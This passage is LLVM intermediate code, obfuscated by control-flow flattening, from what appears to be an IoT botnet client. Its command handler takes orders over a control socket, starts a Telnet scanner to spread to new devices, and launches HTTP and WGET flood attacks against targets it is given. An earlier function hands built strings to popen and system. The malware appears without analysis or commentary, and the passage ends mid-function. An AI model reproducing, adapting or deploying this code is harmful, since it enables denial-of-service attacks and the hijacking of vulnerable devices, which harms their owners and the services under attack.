  %17 = call i8* @strcat(i8* %15, i8* %16) #5
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  %switchVar = alloca i32
  store i32 958981368, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 958981368, label %20
    i32 -1550770835, label %26
    i32 650866297, label %29
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = call i64 @time(i64* null) #5
  %24 = icmp sgt i64 %22, %23
  %25 = select i1 %24, i32 -1550770835, i32 650866297
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %28 = call i32 @system(i8* %27)
  store i32 958981368, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %26, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  store i32 %40, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 702171321, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 702171321, label %first
    i32 1333012857, label %43
    i32 1621707789, label %44
    i32 -1225014796, label %51
    i32 921519535, label %58
    i32 1018314784, label %65
    i32 871763724, label %66
    i32 -836156684, label %70
    i32 -2141519435, label %71
    i32 -300595089, label %75
    i32 -313319066, label %77
    i32 134337218, label %81
    i32 -901023104, label %82
    i32 -74610373, label %83
    i32 -1131282997, label %84
    i32 -126475242, label %89
    i32 1442972384, label %104
    i32 2026092878, label %107
    i32 125450182, label %108
    i32 -1257399707, label %115
    i32 1790192294, label %119
    i32 -1864575338, label %120
    i32 -975448676, label %123
    i32 -1284363036, label %130
    i32 1562274440, label %142
    i32 265084451, label %147
    i32 1012054328, label %148
    i32 -509871657, label %149
    i32 1690916410, label %156
    i32 25044019, label %160
    i32 -2044862273, label %167
    i32 -367372882, label %174
    i32 871612784, label %175
    i32 -709934552, label %179
    i32 1099477396, label %180
    i32 1786646788, label %203
    i32 -1627288300, label %210
    i32 1024942766, label %214
    i32 -269417489, label %221
    i32 -448766970, label %228
    i32 -146982869, label %229
    i32 -2130577327, label %233
    i32 -383214376, label %234
    i32 -729799978, label %257
    i32 1464072573, label %264
    i32 -512706081, label %268
    i32 1407074507, label %275
    i32 -321084711, label %282
    i32 2072333124, label %283
    i32 -260143934, label %287
    i32 -1629934833, label %288
    i32 -1959622421, label %311
    i32 864268787, label %318
    i32 -1428209319, label %322
    i32 -625910548, label %329
    i32 539735524, label %330
    i32 -1871510192, label %342
    i32 -1686717006, label %345
    i32 479038347, label %349
    i32 -1841401697, label %353
    i32 360479093, label %354
    i32 1736794370, label %358
    i32 -1741731011, label %363
    i32 -1308671472, label %366
    i32 -849178900, label %368
    i32 -363781893, label %369
    i32 -1929531505, label %373
    i32 -1887161282, label %374
    i32 132623573, label %375
    i32 -1803720294, label %379
    i32 318157869, label %384
    i32 -2063317720, label %387
    i32 1324340673, label %388
    i32 -1145064511, label %395
    i32 538488124, label %399
    i32 1348680182, label %406
    i32 -1129934046, label %413
    i32 -527192805, label %420
    i32 -1933278541, label %427
    i32 -950739585, label %431
    i32 758143814, label %438
    i32 119326040, label %439
    i32 1033791472, label %458
    i32 2098905230, label %463
    i32 -416310411, label %464
    i32 902086530, label %469
    i32 -918932116, label %472
    i32 -867544609, label %476
    i32 1773254161, label %480
    i32 1630191936, label %487
    i32 117673867, label %489
    i32 -791691418, label %490
    i32 1287650895, label %494
    i32 -281597169, label %495
    i32 -563543003, label %502
    i32 -2012111234, label %503
    i32 176396609, label %510
    i32 -637957776, label %514
    i32 1336961841, label %521
    i32 152023676, label %528
    i32 -1511713600, label %532
    i32 -826673759, label %539
    i32 -1353460412, label %543
    i32 1727725243, label %550
    i32 150272358, label %551
    i32 -1610509083, label %569
    i32 -1180833452, label %574
    i32 -1856527863, label %575
    i32 624671124, label %579
    i32 297144151, label %584
    i32 -1034253379, label %585
    i32 -1102418982, label %590
    i32 1922623066, label %593
    i32 -258368808, label %597
    i32 -1160638906, label %601
    i32 -491864140, label %609
    i32 1315118981, label %611
    i32 -1824722292, label %612
    i32 1670611244, label %616
    i32 -1003763074, label %617
    i32 20508923, label %625
    i32 1846088708, label %626
    i32 -386912496, label %633
    i32 708901113, label %637
    i32 1635301913, label %644
    i32 -1232931767, label %651
    i32 1179591996, label %652
    i32 837668723, label %668
    i32 -290696839, label %671
    i32 -694186, label %675
    i32 -1050999893, label %679
    i32 8985579, label %683
    i32 -31553398, label %685
    i32 -126355794, label %686
    i32 271524898, label %690
    i32 -2052420110, label %691
    i32 1738542061, label %695
    i32 -363954849, label %696
    i32 415768360, label %703
    i32 -302393387, label %704
    i32 359323319, label %709
    i32 853143549, label %716
    i32 -1500812569, label %724
    i32 -2065663767, label %732
    i32 1193599859, label %733
    i32 -723004209, label %736
    i32 -1262172476, label %740
    i32 500349447, label %741
    i32 121633294, label %742
    i32 -1927237122, label %743
    i32 -1343937859, label %750
    i32 962664299, label %755
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %41 = icmp ne i32 %.reload, 0
  %42 = select i1 %41, i32 1621707789, i32 1333012857
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.182, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -509871657, i32 -1225014796
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0)) #9
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 125450182, i32 921519535
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = call i32 @fork() #5
  store i32 %59, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %60 = call i64 @sysconf(i32 84) #5
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %62 = load i32, i32* %7, align 4
  %63 = icmp eq i32 %62, 1
  %64 = select i1 %63, i32 1018314784, i32 871763724
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 500, i32* %8, align 4
  store i32 871763724, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %7, align 4
  %68 = icmp sge i32 %67, 2
  %69 = select i1 %68, i32 -836156684, i32 -2141519435
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 1000, i32* %8, align 4
  store i32 -2141519435, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %5, align 4
  %73 = icmp ugt i32 %72, 0
  %74 = select i1 %73, i32 -300595089, i32 -313319066
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %5, align 4
  store i32 %76, i32* @scanPid, align 4
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %5, align 4
  %79 = icmp eq i32 %78, -1
  %80 = select i1 %79, i32 134337218, i32 -901023104
  store i32 %80, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  store i32 -74610373, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -1131282997, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %7, align 4
  %87 = icmp slt i32 %85, %86
  %88 = select i1 %87, i32 -126475242, i32 2026092878
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = call i64 @time(i64* null) #5
  %91 = call i32 @getpid() #5
  %92 = sext i32 %91 to i64
  %93 = xor i64 %90, %92
  %94 = call i32 @getppid() #5
  %95 = sext i32 %94 to i64
  %96 = add nsw i64 %93, %95
  %97 = trunc i64 %96 to i32
  call void @srand(i32 %97) #5
  %98 = call i64 @time(i64* null) #5
  %99 = call i32 @getpid() #5
  %100 = sext i32 %99 to i64
  %101 = xor i64 %98, %100
  %102 = trunc i64 %101 to i32
  call void @init_rand(i32 %102)
  %103 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %103)
  call void @_exit(i32 0) #11
  unreachable

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %6, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %6, align 4
  store i32 -1131282997, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 125450182, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 @strcmp(i8* %111, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #9
  %113 = icmp ne i32 %112, 0
  %114 = select i1 %113, i32 -975448676, i32 -1257399707
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* @scanPid, align 4
  %117 = icmp eq i32 %116, 0
  %118 = select i1 %117, i32 1790192294, i32 -1864575338
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* @scanPid, align 4
  %122 = call i32 @kill(i32 %121, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  store i32 -975448676, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @strcmp(i8* %126, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i32 0, i32 0)) #9
  %128 = icmp ne i32 %127, 0
  %129 = select i1 %128, i32 1012054328, i32 -1284363036
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 1
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #9
  store i32 %134, i32* %9, align 4
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 2
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137) #9
  store i32 %138, i32* %10, align 4
  %139 = call i32 @listFork()
  %140 = icmp ne i32 %139, 0
  %141 = select i1 %140, i32 265084451, i32 1562274440
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i32 (i32, i8*, ...) @sockprintf(i32 %143, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i32 0, i32 0))
  %145 = load i32, i32* %10, align 4
  %146 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %145, i32 %146)
  call void @_exit(i32 0) #11
  unreachable

; <label>:147:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 -509871657, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @strcmp(i8* %152, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i32 0, i32 0)) #9
  %154 = icmp ne i32 %153, 0
  %155 = select i1 %154, i32 1786646788, i32 1690916410
  store i32 %155, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %3, align 4
  %158 = icmp slt i32 %157, 6
  %159 = select i1 %158, i32 -367372882, i32 25044019
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 3
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #9
  %165 = icmp slt i32 %164, 1
  %166 = select i1 %165, i32 -367372882, i32 -2044862273
  store i32 %166, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 5
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #9
  %172 = icmp slt i32 %171, 1
  %173 = select i1 %172, i32 -367372882, i32 871612784
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = call i32 @listFork()
  %177 = icmp ne i32 %176, 0
  %178 = select i1 %177, i32 -709934552, i32 1099477396
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i8**, i8*** %4, align 8
  %182 = getelementptr inbounds i8*, i8** %181, i64 1
  %183 = load i8*, i8** %182, align 8
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 2
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 3
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #9
  %191 = trunc i32 %190 to i16
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 4
  %194 = load i8*, i8** %193, align 8
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 5
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197) #9
  %199 = load i8**, i8*** %4, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 6
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201) #9
  call void @SendHTTP(i8* %183, i8* %186, i16 zeroext %191, i8* %194, i32 %198, i32 %202)
  call void @exit(i32 0) #12
  unreachable

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 0
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)) #9
  %208 = icmp ne i32 %207, 0
  %209 = select i1 %208, i32 -729799978, i32 -1627288300
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %3, align 4
  %212 = icmp slt i32 %211, 6
  %213 = select i1 %212, i32 -448766970, i32 1024942766
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 3
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #9
  %219 = icmp slt i32 %218, 1
  %220 = select i1 %219, i32 -448766970, i32 -269417489
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8**, i8*** %4, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 5
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #9
  %226 = icmp slt i32 %225, 1
  %227 = select i1 %226, i32 -448766970, i32 -146982869
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = call i32 @listFork()
  %231 = icmp ne i32 %230, 0
  %232 = select i1 %231, i32 -2130577327, i32 -383214376
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 1
  %237 = load i8*, i8** %236, align 8
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 2
  %240 = load i8*, i8** %239, align 8
  %241 = load i8**, i8*** %4, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 3
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 @atoi(i8* %243) #9
  %245 = trunc i32 %244 to i16
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 4
  %248 = load i8*, i8** %247, align 8
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 5
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 @atoi(i8* %251) #9
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 6
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #9
  call void @SendHTTPHEX(i8* %237, i8* %240, i16 zeroext %245, i8* %248, i32 %252, i32 %256)
  call void @exit(i32 0) #12
  unreachable

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8**, i8*** %4, align 8
  %259 = getelementptr inbounds i8*, i8** %258, i64 0
  %260 = load i8*, i8** %259, align 8
  %261 = call i32 @strcmp(i8* %260, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i32 0, i32 0)) #9
  %262 = icmp ne i32 %261, 0
  %263 = select i1 %262, i32 -1959622421, i32 1464072573
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %3, align 4
  %266 = icmp slt i32 %265, 6
  %267 = select i1 %266, i32 -321084711, i32 -512706081
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 3
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #9
  %273 = icmp slt i32 %272, 1
  %274 = select i1 %273, i32 -321084711, i32 1407074507
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #9
  %280 = icmp slt i32 %279, 1
  %281 = select i1 %280, i32 -321084711, i32 2072333124
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = call i32 @listFork()
  %285 = icmp ne i32 %284, 0
  %286 = select i1 %285, i32 -260143934, i32 -1629934833
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 1
  %291 = load i8*, i8** %290, align 8
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 2
  %294 = load i8*, i8** %293, align 8
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 3
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #9
  %299 = trunc i32 %298 to i16
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 4
  %302 = load i8*, i8** %301, align 8
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 5
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #9
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 6
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #9
  call void @SendHTTPTXT(i8* %291, i8* %294, i16 zeroext %299, i8* %302, i32 %306, i32 %310)
  call void @exit(i32 0) #12
  unreachable

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 0
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @strcmp(i8* %314, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i32 0, i32 0)) #9
  %316 = icmp ne i32 %315, 0
  %317 = select i1 %316, i32 1324340673, i32 864268787
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %3, align 4
  %320 = icmp slt i32 %319, 3
  %321 = select i1 %320, i32 -625910548, i32 -1428209319
  store i32 %321, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 2
  %325 = load i8*, i8** %324, align 8
  %326 = call i32 @atoi(i8* %325) #9
  %327 = icmp slt i32 %326, 1
  %328 = select i1 %327, i32 -625910548, i32 539735524
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i8**, i8*** %4, align 8
  %332 = getelementptr inbounds i8*, i8** %331, i64 1
  %333 = load i8*, i8** %332, align 8
  store i8* %333, i8** %11, align 8
  %334 = load i8**, i8*** %4, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 2
  %336 = load i8*, i8** %335, align 8
  %337 = call i32 @atoi(i8* %336) #9
  store i32 %337, i32* %12, align 4
  %338 = load i8*, i8** %11, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %340 = icmp ne i8* %339, null
  %341 = select i1 %340, i32 -1871510192, i32 -363781893
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8*, i8** %11, align 8
  %344 = call i8* @strtok(i8* %343, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %344, i8** %13, align 8
  store i32 -1686717006, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i8*, i8** %13, align 8
  %347 = icmp ne i8* %346, null
  %348 = select i1 %347, i32 479038347, i32 -849178900
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @listFork()
  %351 = icmp ne i32 %350, 0
  %352 = select i1 %351, i32 -1308671472, i32 -1841401697
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 360479093, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i32, i32* %14, align 4
  %356 = icmp slt i32 %355, 10
  %357 = select i1 %356, i32 1736794370, i32 -1741731011
  store i32 %357, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8*, i8** %11, align 8
  %360 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %359, i32 %360)
  %361 = load i32, i32* %14, align 4
  %362 = add nsw i32 %361, 1
  store i32 %362, i32* %14, align 4
  store i32 360479093, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i32, i32* @mainCommSock, align 4
  %365 = call i32 @close(i32 %364)
  call void @_exit(i32 0) #11
  unreachable

; <label>:366:                                    ; preds = %loopEntry
  %367 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %367, i8** %13, align 8
  store i32 -1686717006, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  store i32 -2063317720, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = call i32 @listFork()
  %371 = icmp ne i32 %370, 0
  %372 = select i1 %371, i32 -1929531505, i32 -1887161282
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 132623573, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i32, i32* %15, align 4
  %377 = icmp slt i32 %376, 10
  %378 = select i1 %377, i32 -1803720294, i32 318157869
  store i32 %378, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i8*, i8** %11, align 8
  %381 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %380, i32 %381)
  %382 = load i32, i32* %15, align 4
  %383 = add nsw i32 %382, 1
  store i32 %383, i32* %15, align 4
  store i32 132623573, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i32, i32* @mainCommSock, align 4
  %386 = call i32 @close(i32 %385)
  call void @_exit(i32 0) #11
  unreachable

; <label>:387:                                    ; preds = %loopEntry
  store i32 1324340673, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 0
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @strcmp(i8* %391, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0)) #9
  %393 = icmp ne i32 %392, 0
  %394 = select i1 %393, i32 -2012111234, i32 -1145064511
  store i32 %394, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i32, i32* %3, align 4
  %397 = icmp slt i32 %396, 6
  %398 = select i1 %397, i32 758143814, i32 538488124
  store i32 %398, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
